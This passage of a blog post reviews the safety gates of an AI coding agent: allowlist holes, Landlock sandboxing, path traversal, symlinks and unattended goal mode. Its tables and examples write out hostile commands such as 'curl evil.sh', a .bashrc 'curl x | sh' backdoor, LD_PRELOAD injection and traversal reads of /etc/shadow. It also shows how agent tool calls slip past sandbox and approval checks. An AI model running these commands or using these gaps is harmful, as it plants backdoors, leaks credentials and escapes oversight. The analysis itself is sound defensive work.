+<p><strong>Two: <code>--exec-path</code> is not in the list but starts with a dash</strong>, so it is skipped, and <code>git --exec-path=/tmp status</code> makes git look for <code>git-status</code> in <code>/tmp</code>.</p>
+
+<p><strong>Three, and the fundamental one: aliases.</strong> With <code>alias.status = !rm -rf /tmp/x</code> in <code>~/.gitconfig</code>, <code>git status</code> expands to that shell command. The checker sees <code>status</code>, trusts it, and something else runs.</p>
+
+<p>The only fix for the third is to look at what git will actually do, by querying <code>git config --get alias.status</code>, or by removing git from the trusted list entirely. The saving from not prompting on read-only git commands is small next to these three holes, especially since <code>git status</code> usually comes with <code>git diff</code> and <code>git log</code>, all hijackable the same way.</p>
+
+<h2>Metacharacter blocking: those nine characters are necessary</h2>
+
+<table>
+<thead><tr><th>Character</th><th>Blocks</th><th>If missing</th></tr></thead>
+<tbody>
+<tr><td>pipe</td><td>Pipelines</td><td><code>ls | rm -rf /</code></td></tr>
+<tr><td><code>&amp;</code></td><td>Background, logical and</td><td><code>ls &amp;&amp; curl evil.sh</code></td></tr>
+<tr><td><code>;</code></td><td>Command separators</td><td><code>ls; rm -rf /</code></td></tr>
+<tr><td><code>&lt;</code></td><td>Input redirection</td><td><code>cat &lt; /etc/shadow</code></td></tr>
+<tr><td><code>&gt;</code></td><td>Output redirection</td><td><code>echo x &gt; ~/.bashrc</code></td></tr>
+<tr><td>backtick</td><td>Command substitution</td><td>A substitution after a harmless command</td></tr>
+<tr><td><code>$</code></td><td>Variables and substitution</td><td><code>ls $(rm -rf /)</code></td></tr>
+<tr><td><code>(</code> <code>)</code></td><td>Subshells</td><td><code>(rm -rf /)</code></td></tr>
+<tr><td>newline</td><td>Multi-line commands</td><td>A second line after a harmless first</td></tr>
+</tbody>
+</table>
+
+<p>The block does not cover backslashes, so <code>m</code> would be judged untrusted because the name does not match. That errs toward prompting, which is fine. Comments and quotes are not blocked, and do not need to be.</p>
+
+<p>So the nine characters are sufficient for their purpose. The real risk is not metacharacters, it is judging program identity. Metacharacters stop one command doing several things. <code>sort -o</code>, <code>/tmp/ls</code> and <code>LD_PRELOAD</code> are one command doing one thing that is not what you think.</p>
+
+<h2>Landlock: a kernel sandbox with no crates</h2>
+
+<p>Linux 5.13 added Landlock, an unprivileged mechanism for a process to restrict itself. A process installs a ruleset declaring which paths it may access and with which rights, and the restriction cannot be removed and is inherited by children. That is exactly what a sandbox needs.</p>
+
+<pre><code>const SYS_LANDLOCK_CREATE_RULESET: usize = 444;
+const SYS_LANDLOCK_ADD_RULE: usize = 445;
+const SYS_LANDLOCK_RESTRICT_SELF: usize = 446;
+</code></pre>
+
+<p>The numbers are identical on x86_64 and aarch64, deliberately, so no per-architecture branching is needed. One prctl is also required, <code>PR_SET_NO_NEW_PRIVS</code>, and it has to come first, because a Landlock ruleset only takes effect without new privileges, otherwise a setuid binary could escape it.</p>
+
+<h2>What pre_exec may and may not do</h2>
+
+<pre><code>cmd.pre_exec(move || {
+    apply(handled, abi, root.as_c_str(), ws.as_deref())
+        .map_err(std::io::Error::from_raw_os_error)
+});
+</code></pre>
+
+<p>This closure runs in the forked child before exec, where only one thread exists and every other thread's locks are in an unknown state. So the closure must not allocate memory, must not take any lock, must not call a non-async-signal-safe function, and must not format, print or panic.</p>
+
+<p>The implementation respects that: <code>apply</code> uses two stack-allocated <code>repr(C)</code> structs, issues raw syscalls, and returns an errno instead of building a string. The safety comment says so explicitly. This is the easiest place to get the sandbox wrong: formatting an error message on failure would malloc in a forked child and occasionally deadlock under load, presenting as "the command sometimes hangs".</p>
+
+<p>Both C strings are built before the fork and moved in, so the closure only calls <code>as_c_str()</code>. Moving all preparation ahead of the fork is the correct pattern for <code>pre_exec</code>.</p>
+
+<h2>ABI versions and why permission bits are trimmed</h2>
+
+<pre><code>fn handled_fs_bits(abi: u32) -&gt; u64 {
+    let mut bits = ALL_FS;
+    if abi &lt; 2 {
+        bits &amp;= !FS_REFER;      // cross-directory rename arrived in ABI 2
+    }
+    if abi &lt; 3 {
+        bits &amp;= !FS_TRUNCATE;   // truncate arrived in ABI 3
+    }
+    if abi &lt; 5 {
+        bits &amp;= !FS_IOCTL_DEV;  // device ioctl arrived in ABI 5
+    }
+    bits
+}
+</code></pre>
+
+<p>The trimming is mandatory, not an optimization: passing a bit the kernel does not know makes <code>create_ruleset</code> fail with EINVAL and the sandbox never installs, which here means no command runs at all.</p>
+
+<p>Struct size is versioned the same way, and passing a smaller struct than the kernel understands is legal because unknown fields read as zero.</p>
+
+<p>The ABI handling carries a hidden assumption: the constant table must be maintained alongside kernel versions. If ABI 7 adds a dimension that <code>ALL_FS</code> does not mention, the sandbox silently does not cover it, because Landlock restricts exactly the dimensions you declare and allows everything else. A missing bit never fails; it just protects less.</p>
+
+<h2>A read-only root and a writable workspace</h2>
+
+<pre><code>// 3. read and execute everywhere, write denied by default
+add_path_rule(rs_fd, root, READ_EXEC)?;
+// 4. in workspace-write mode the workspace gets everything
+if let Some(ws) = ws {
+    add_path_rule(rs_fd, ws, handled)?;
+}
+</code></pre>
+
+<p><code>READ_EXEC</code> is execute plus read file plus read directory, with no write bits, while <code>handled</code> declares every write bit, so unmentioned rights are denied. Default deny, explicit grant.</p>
+
+<p>Read-only mode adds no second rule, so the whole filesystem is read and execute only. Workspace-write grants the workspace everything, including creating devices and sockets.</p>
+
+<p>One consequence is easy to miss: <code>READ_EXEC</code> covers all of <code>/</code>, so a sandboxed command can read <code>~/.ssh/id_rsa</code>, <code>~/.aws/credentials</code>, <code>.env</code> and other projects' source. The sandbox restricts writing, not reading. Restricting reads would break almost every command, since <code>sh</code> needs its libraries and <code>cargo</code> needs its registry.</p>
+
+<p>But that means exfiltration is a real risk: <code>cat ~/.ssh/id_rsa</code> is a read-only command that runs without asking, and the contents become tool output, then part of the next request to the model provider.</p>
+
+<h2>The network is not restricted</h2>
+
+<pre><code>let attr = RulesetAttr {
+    handled_access_fs: handled,
+    handled_access_net: 0,
+    scoped: 0,
+};
+</code></pre>
+
+<p>Zero means "I do not handle the network dimension", so networking is unrestricted: any IP and port, uploads via curl, reverse shells, cloud metadata at 169.254.169.254. As a filesystem-write sandbox that is a coherent boundary, but if the goal is running untrusted code it is wide open.</p>
+
+<p>Closing it is cheap on ABI 4 and up: declare the TCP bits and grant no port rules, which denies everything. That breaks every networked command, so it belongs in a third mode rather than in the existing ones, which is a reminder that "sandbox mode" is more than one dimension: filesystem, network, process, IPC, and each dimension doubles the combinations.</p>
+
+<h2>Fail closed, and why it will not degrade</h2>
+
+<pre><code>let abi = landlock_abi().ok_or_else(|| {
+    "this kernel does not expose Landlock (Linux &gt;= 5.13 required);      refusing to run unsandboxed"
+        .to_string()
+})?;
+</code></pre>
+
+<p>When the kernel does not support it, the command does not run unsandboxed, it fails. Non-Linux platforms behave the same, and there is a startup warning for the combination.</p>
+
+<p>The reasoning matters: the sandbox's promise is that writes do not leave the workspace. Silent degradation would turn that promise into "usually does not leave the workspace", while the user believes it is absolute. <strong>The most dangerous failure of a security mechanism is a silent one</strong>, because it changes nothing about the user's behavior and everything about the actual protection.</p>
+
+<p>The cost is that on macOS and Windows, enabling the sandbox makes every command fail. The warning is printed once and does not stop startup, which is reasonable, though a rejected start would be better for goal mode plus sandbox on an unsupported platform, since that combination is unattended plus every command failing.</p>
+
+<h2>The sandbox covers child processes only</h2>
+
+<table>
+<thead><tr><th>Tool</th><th>check_tool</th><th>Hook</th><th>Approval</th><th>Landlock</th></tr></thead>
+<tbody>
+<tr><td><code>read_file</code></td><td>Yes</td><td>Yes</td><td>No</td><td><strong>No</strong></td></tr>
+<tr><td><code>write_file</code></td><td>Yes</td><td>Yes</td><td>No</td><td><strong>No</strong></td></tr>
+<tr><td><code>edit_file</code></td><td>Yes</td><td>Yes</td><td>No</td><td><strong>No</strong></td></tr>
+<tr><td><code>apply_patch</code></td><td>Yes</td><td>Yes</td><td>No</td><td><strong>No</strong></td></tr>
+<tr><td><code>run_command</code>, foreground</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td></tr>
+<tr><td><code>run_command</code>, background</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td></tr>
+<tr><td><code>git_commit</code></td><td>Yes</td><td>Yes</td><td>Yes</td><td><strong>No</strong></td></tr>
+<tr><td><code>web_fetch</code></td><td>Yes</td><td>Yes</td><td>No</td><td>No, in-process HTTP</td></tr>
+</tbody>
+</table>
+
+<p>Built-in file tools spawn nothing, and the sandbox attaches to child processes, so it cannot reach them. The practical meaning of <code>sandbox: workspace-write</code> is that <strong>child processes</strong> cannot write outside the workspace, not that the agent cannot.</p>
+
+<pre><code>write_file(path="/home/user/.ssh/authorized_keys", content="ssh-rsa AAAA...")
+</code></pre>
+
+<p>That call passes <code>check_tool</code>, triggers no hook, needs no approval because approval lives in the shell path, and meets no sandbox because there is no child process. All four gates are simply not applicable.</p>
+
+<p>The fix is not another gate. What is missing is that built-in tools have no sandbox at all. One option is a path check inside the file tools; the other, putting built-in tools behind Landlock, is impossible, since the restriction is process-wide and irreversible, and the agent would lose access to its own configuration and prompts. So the path check is the only option, and doing it correctly means handling normalization, symlinks, and which paths are legitimate exceptions.</p>
+
+<h2>resolve does no normalization</h2>
+
+<pre><code>pub fn resolve(root: &amp;Path, p: &amp;str) -&gt; PathBuf {
+    let path = Path::new(p);
+    if path.is_absolute() {
+        path.to_path_buf()
+    } else {
+        root.join(path)
+    }
+}
+</code></pre>
+
+<p>Neither branch normalizes anything. An absolute path passes through, and a relative one is only joined, so <code>../../etc/passwd</code> becomes <code>&lt;root&gt;/../../etc/passwd</code>, which the filesystem resolves to <code>/etc/passwd</code>. The exploitation difficulty is the same as writing the absolute path.</p>
+
+<pre><code>read_file(path="../../../../etc/shadow")
+</code></pre>
+
+<p><code>is_absolute()</code> is false for that string, so it is joined, and the read follows the parent directories out. Note that <code>canonicalize()</code> alone is not the fix either: it resolves symlinks and requires the path to exist, which a file about to be created does not.</p>
+
+<pre><code>fn resolve_checked(root: &amp;Path, p: &amp;str) -&gt; Result&lt;PathBuf, String&gt; {
+    let joined = if Path::new(p).is_absolute() {
+        PathBuf::from(p)
+    } else {
+        root.join(p)
+    };
+    // 1. lexical normalization: remove . and ..
+    let mut out = PathBuf::new();
+    for comp in joined.components() {
+        match comp {
+            Component::ParentDir =&gt; { out.pop(); }
+            Component::CurDir =&gt; {}
+            other =&gt; out.push(other),
+        }
+    }
+    // 2. prefix check, lexically
+    if !out.starts_with(root) {
+        return Err(format!("path {} escapes the workspace", out.display()));
+    }
+    // 3. if it exists, re-check against the canonical path
+    if let Ok(real) = out.canonicalize() {
+        let root_real = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
+        if !real.starts_with(&amp;root_real) {
+            return Err(format!("path {} resolves outside the workspace", real.display()));
+        }
+    }
+    Ok(out)
+}
+</code></pre>
+
+<p>Each step has a job: the first stops <code>..</code>, the second stops absolute paths, the third stops symlinks. The third only works for existing paths, which is exactly where the next hole is.</p>
+
+<h2>Symlinks: the kernel and the built-in tools disagree</h2>
+
+<p>Landlock judges by the real path resolved when a file is opened. With <code>ln -s /etc/passwd ws/link</code>, a sandboxed <code>echo x &gt;&gt; ws/link</code> is denied, because the kernel resolves to <code>/etc/passwd</code>, which only has read and execute rights. Landlock is reliable here.</p>
+
+<p>Built-in tools have no such protection. <code>write_file</code> calls <code>fs::write</code>, which follows symlinks, so writing to <code>link</code> writes to <code>/etc/passwd</code>.</p>
+
+<p>Which produces an absurd combination: with <code>workspace-write</code> on, <code>run_command</code> cannot write <code>/etc/passwd</code> and <code>write_file</code> can. Security depends on which tool the model picks, and the model only knows which is more convenient.</p>
+
+<p>For a new file, canonicalization fails and the third step is skipped. The fix is to canonicalize the deepest existing ancestor and reattach the rest.</p>
+
+<pre><code>let mut ancestor = out.clone();
+let mut tail = Vec::new();
+while !ancestor.exists() {
+    if let Some(name) = ancestor.file_name() { tail.push(name.to_os_string()); }
+    if !ancestor.pop() { break; }
+}
+let real_ancestor = ancestor.canonicalize()?;
+let real_full = real_ancestor.join(tail.iter().rev().collect::&lt;PathBuf&gt;());
+if !real_full.starts_with(&amp;root_real) { return Err(...) }
+</code></pre>
+
+<p>Fifteen lines, and the only correct way to prevent traversal through a symlink for a file that does not exist yet. Without it, the attack is: commit a directory symlink pointing at <code>~/.ssh</code>, then have the agent write a file that looks like it is inside the repository.</p>
+
+<h2>Four escape surfaces</h2>
+
+<table>
+<thead><tr><th>Surface</th><th>Child process</th><th>Built-in tool</th><th>Root cause</th></tr></thead>
+<tbody>
+<tr><td>Absolute paths</td><td>Landlock restricts writes</td><td>Passes through</td><td>The sandbox is on the child</td></tr>
+<tr><td><code>..</code> traversal</td><td>Landlock judges real paths</td><td>Passes through</td><td><code>resolve</code> does not normalize</td></tr>
+<tr><td>Symlinks</td><td>The kernel resolves them</td><td>Followed, unchecked</td><td><code>fs::write</code> semantics</td></tr>
+<tr><td>Network</td><td>Unrestricted</td><td>Unrestricted</td><td>Neither handles it</td></tr>
+</tbody>
+</table>
+
+<p>The first three are "the child is protected, the built-in tool is not". The fourth is neither. What this table says is that security depends on which tool the model chooses, and the model does not know that. Fixing it does not mean another gate, it means bringing built-in tools under the same path policy, ideally by making <code>resolve</code> return a <code>Result</code> so the compiler lists every call site that has to decide what out-of-bounds means.</p>
+
+<h2>The mode and sandbox matrix</h2>
+
+<table>
+<thead><tr><th>Mode  sandbox</th><th>off</th><th>read-only</th><th>workspace-write</th></tr></thead>
+<tbody>
+<tr><td><code>default</code></td><td>Everything</td><td>Children read-only</td><td>Children limited to the workspace</td></tr>
+<tr><td><code>accept-edits</code></td><td>Edits unasked, commands asked</td><td>Same, children read-only</td><td>Same, children limited</td></tr>
+<tr><td><code>plan</code></td><td>Read-only, no commands</td><td>Read-only, no commands</td><td>Read-only, no commands</td></tr>
+<tr><td><code>goal</code></td><td><strong>Everything, unasked</strong></td><td>Every command fails on non-Linux</td><td>Children limited</td></tr>
+<tr><td><code>debug</code></td><td>Commands yes, writes no</td><td>Same</td><td>Children limited</td></tr>
+</tbody>
+</table>
+
+<p>The plan row shows the sandbox doing nothing, because commands are blocked and the sandbox only affects children. Plan's strength comes from blocking the write tools instead.</p>
+
+<p>The goal row shows the most dangerous cell: unattended, unapproved and unsandboxed means the model can do anything to the machine. Nothing prevents that combination, and since sandbox defaults to off, <strong>default goal mode is that cell</strong>.</p>
+
+<p>Which suggests the two flags should not be independent at all, but a safety level with a fixed bundle of settings, since 15 combinations include several nobody would choose deliberately and a few that are actively dangerous.</p>
+
+<h2>Why plan mode is not a read-only sandbox</h2>
+
+<p>Plan blocks tools, not paths. It removes the ability to write by removing the tools, which works today and will not cover a tool added tomorrow, such as a query tool that can update rows.</p>
+
+<p>It does not restrict reads either. Plan mode reads everything, and so does a read-only sandbox; the difference is that plan means "I do not change things" while the sandbox means "the process cannot".</p>
+
+<p>And it depends on a hand-written list of five tool names. Add a tool that writes and forget to list it, and plan mode silently grows a write entrance. Any mechanism whose safety depends on remembering to update a list gets worse over time.</p>
+
+<p>The sturdier design tags each tool with capabilities such as <code>fs.write</code>, <code>process.spawn</code> or <code>net.egress</code>, and blocks by tag rather than by name. That is about 100 lines across 24 tools and it turns "safety depends on remembering" into "safety depends on classification".</p>
+
+<h2>Goal mode has nobody to ask</h2>
+
+<p>Goal mode forces approval on and policy to never, which permanently closes the approval gate. Honest, and it pushes all responsibility onto the other three gates.</p>
+
+<table>
+<thead><tr><th>Gate</th><th>State in goal mode</th></tr></thead>
+<tbody>
+<tr><td>Tool list</td><td>Effective</td></tr>
+<tr><td><code>check_tool</code></td><td>Effective, but goal blocks nothing</td></tr>
+<tr><td>PreToolUse hooks</td><td>Effective, the only custom interception point</td></tr>
+<tr><td>Approval</td><td><strong>Off</strong></td></tr>
+<tr><td>Landlock</td><td>Depends on the sandbox flag, default off</td></tr>
+</tbody>
+</table>
+
+<p>So goal's real strength equals whatever hooks are configured plus whether the sandbox is on. With neither, it is zero.</p>
+
+<p>Three things an unattended mode should do: default the sandbox on and refuse or warn when it is off; require at least one PreToolUse hook, since hooks are the only way to express "do not touch these paths" without a human; and add a wall-clock budget, because iteration limits do not bound total commands, total bytes written or elapsed time, and a runaway goal run can produce hundreds of writes in half an hour.</p>
+
+<h2>Seven attack scenarios</h2>
+
+<p>Assume the defaults: approval on, sandbox off, default mode. Only <code>check_tool</code> and hooks are in play.</p>
+
+<table>
+<thead><tr><th>#</th><th>Payload</th><th>Gates passed</th><th>Result</th></tr></thead>
+<tbody>
+<tr><td>1</td><td><code>read_file("~/.ssh/id_rsa")</code></td><td>All</td><td>Key enters context and leaves with the next request</td></tr>
+<tr><td>2</td><td><code>write_file("/home/u/.bashrc", "curl x | sh")</code></td><td>All</td><td>A persistent backdoor</td></tr>
+<tr><td>3</td><td><code>read_file("../../../../etc/passwd")</code></td><td>All</td><td>System file read</td></tr>
+<tr><td>4</td><td><code>run_command("sort -o ~/.bashrc x")</code></td><td>Approval, misjudged read-only</td><td>File overwritten</td></tr>
+<tr><td>5</td><td><code>run_command("/tmp/x/ls -la")</code></td><td>Approval, basename hit</td><td>Arbitrary program runs</td></tr>
+<tr><td>6</td><td><code>run_command("LD_PRELOAD=/tmp/e.so ls")</code></td><td>Approval, assignment skipped</td><td>Arbitrary code runs</td></tr>
+<tr><td>7</td><td><code>run_command("git status")</code></td><td>Approval, subcommand hit</td><td>The alias runs its command</td></tr>
+</tbody>
+</table>
+
+<p>None of these is a clever chain. Each is one step, one command, no obfuscation. They pass for the same reason: the check judges <strong>what the command looks like</strong>, not what it will do.</p>
+
+<p>Turn on goal mode and scenarios four through seven no longer need a misjudgment, because the approval gate is gone. That comparison makes the real point: with approval on by default, the gate was already inert.</p>
+
+<p>Add <code>--ask</code> and a workspace-write sandbox and four through seven all get prompted, but <strong>one, two and three still pass</strong>, because they are built-in file tools with no path restriction at all. Which is the most important conclusion here: the most effective hardening is not tuning the approval policy, it is adding an out-of-bounds check to <code>resolve</code>, because the first three are the common ones and the ones a model can trigger without meaning to.</p>
+
+<h2>Seven places to harden</h2>
+
+<table>
+<thead><tr><th>#</th><th>Change</th><th>Covers</th><th>Effort</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>Out-of-bounds checks in <code>resolve</code>, lexical and canonical</td><td>Scenarios 1, 2, 3</td><td>40 lines plus a signature change</td></tr>
+<tr><td>2</td><td>Argument-aware read-only checks (<code>-o</code>, <code>-r</code>, <code>-s</code>)</td><td>Scenario 4</td><td>25 lines</td></tr>
+<tr><td>3</td><td>No basename trust for explicit paths</td><td>Scenario 5</td><td>5 lines</td></tr>
+<tr><td>4</td><td>Forbid leading environment assignments</td><td>Scenario 6</td><td>5 lines</td></tr>
+<tr><td>5</td><td>Drop git trust, or verify aliases</td><td>Scenario 7</td><td>5 or 40 lines</td></tr>
+<tr><td>6</td><td>Default approval off, print the posture at startup</td><td>All</td><td>3 lines</td></tr>
+<tr><td>7</td><td>Require a sandbox or a hook in goal mode</td><td>Unattended runs</td><td>15 lines</td></tr>
+</tbody>
+</table>
+
+<p>The first three are real fixes and the rest are policy changes. The first is the most important and the easiest to do badly, because changing the signature produces a wave of compiler errors, each one a decision about what out-of-bounds means: an error for file tools, but an exception for the session store and the memory directory, which suggests two entry points, one checked for workspace paths and one explicit system path that never accepts a model-supplied argument.</p>
+
+<p>The second should follow the same idea as <code>VALUE_FLAGS</code>: trust the invocation, not the program. The current implementation judges while walking the token stream, which is why it accumulated four holes; parsing into an intermediate structure and letting each rule read its own field would not.</p>
+
+<p>The sixth is three lines and it changes the default, which matters more than any single fix, because a default decides the protection received by everyone who never reads the documentation.</p>
+
+<h2>How to test a security boundary</h2>
+
+<p>Security tests assert that what should not happen did not happen.</p>
+
+<pre><code>// read-only: even writes inside the workspace must be refused
+assert_eq!(
+    run_sandboxed(
+        &amp;format!("touch {}/a", ws.display()),
+        SandboxMode::ReadOnly,
+        &amp;ws
+    ),
+    Some(false),
+    "read-only sandbox must deny writes"
+);
+assert!(!ws.join("a").exists());
+
+// workspace-write: writes inside are allowed
+assert_eq!(
+    run_sandboxed(&amp;format!("touch {}/b", ws.display()),
+                 SandboxMode::WorkspaceWrite, &amp;ws),
+    Some(true)
+);
+assert!(ws.join("b").exists());
+
+// workspace-write: writes outside are refused
+assert_eq!(
+    run_sandboxed(&amp;format!("touch {}/c", outside.display()),
+                 SandboxMode::WorkspaceWrite, &amp;ws),
+    Some(false)
+);
+assert!(!outside.join("c").exists());
+</code></pre>
+
+<p>Three assertions cover both directions of failure: the denials that must happen and the permission that must not be denied. The third is the one that catches a sandbox installed incorrectly, because then b fails and you learn the sandbox blocked everything, rather than discovering it in production when nothing runs.</p>
+
+<p>The approval tests pin the short circuit first: with approval on, even <code>rm -rf /</code> must return false. That combination is exactly what silently changes during a refactor, so it needs a test.</p>
+
+<p>What the tests do not cover is the four holes from this post: <code>sort -o</code>, <code>/tmp/ls</code>, <code>LD_PRELOAD</code> and a git alias. That is the general problem with security tests: <strong>known attacks are easy to test, unthought-of attacks are not</strong>. Adding more assertions only covers what you already imagined. Testing properties instead covers more: for every trusted command, run its common flag variants in a scratch directory and assert nothing appears; place sentinel files outside the workspace and assert they never change; statically enumerate every spawn site and assert each one passes through approval.</p>
+
+<h2>Closing</h2>
+
+<p>Security is depth, not strength. Every gate here can be bypassed on its own. Stacked, an attack has to defeat five layers at once to be silent, which is more reliable than one very strong gate that has a single point of failure.</p>
+
+<p>The thinnest layer is usually not the one you expect. The sandbox is the hardest thing here and it has the narrowest coverage. The real hole is that built-in file tools have no path constraint at all, and that is the least alarming-looking place in the system: one filesystem call, no child process, no shell, no approval. Direct IO inside your own process is what security reviews miss.</p>
+
+<p>And defaults are the security level. <code>auto_approve: true</code> plus <code>sandbox: Off</code> disables two of the five gates outright. No single fix is worth as much as changing those two defaults, which is why it needs a deliberate migration decision rather than a quiet edit.</p>
+
+<p>What is worth praising is the honesty: when the kernel does not support Landlock the code refuses instead of degrading; the approval short circuit sits on the first line with no disguise; goal mode says in the comments that there is nobody to ask. Stating the boundaries is much better than claiming safety with a blurry boundary, because only someone who knows where the edge is knows where to reinforce.</p>
+
+<p>The next post is multi-agent: sub-agents, the task board and rate limiting. Concurrency asked how many things happen at once, security asked what they may do, and the next one combines them, which is the question of how to limit and isolate four sub-agents running on your machine at the same time.</p>
+
+<p>Read the Chinese edition: <a href="https://blog.zhoujun.dev/article/agent-security-run-commands-safely/">Agent 安全：让它跑命令而不失控</a>.</p>
+</div><nav class="ns-site-nav"><a href="https://blog.zhoujun.dev/en/">All English posts</a><a href="https://blog.zhoujun.dev/article/agent-security-run-commands-safely/">中文版</a><a href="mailto:edfc1582@shmarpe.resend.app">Email</a><a href="https://github.com/zhoujungis">GitHub</a></nav></div></div>
+  </body>
+</html>
